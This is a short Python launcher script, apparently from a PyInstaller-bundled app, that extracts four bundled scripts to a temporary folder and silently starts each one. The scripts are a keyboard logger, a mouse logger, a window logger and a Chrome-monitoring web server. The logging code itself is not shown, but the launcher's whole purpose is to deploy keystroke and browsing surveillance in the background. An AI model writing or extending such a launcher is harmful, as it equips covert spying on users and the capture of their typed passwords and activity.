import tempfile
import subprocess
import sys
import os

def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS  # PyInstaller temporary folder for the bundled app.
    except Exception:
        base_path = os.path.abspath(".")  # The current directory when running as a script.
    return os.path.join(base_path, relative_path)

def extract_and_run_script(script_name):
    # Extract the script content from the bundled resource
    script_path = get_resource_path(script_name)
    with open(script_path, 'r', encoding='utf-8') as file:
        script_content = file.read()
    
    # Create a temporary file to write the script to
    temp_dir = tempfile.mkdtemp()
    temp_script_path = os.path.join(temp_dir, script_name)
    with open(temp_script_path, 'w', encoding='utf-8') as temp_file:
        temp_file.write(script_content)
    
    # Run the script from its temporary location
    subprocess.Popen(["python", temp_script_path], shell=True)

if __name__ == "__main__":

    scripts = ["chrome_monitor_webserver.py", "keyboard_logger.py", "mouse_logger.py", "windows_logger.py"]
    
    for script in scripts:
        extract_and_run_script(script)
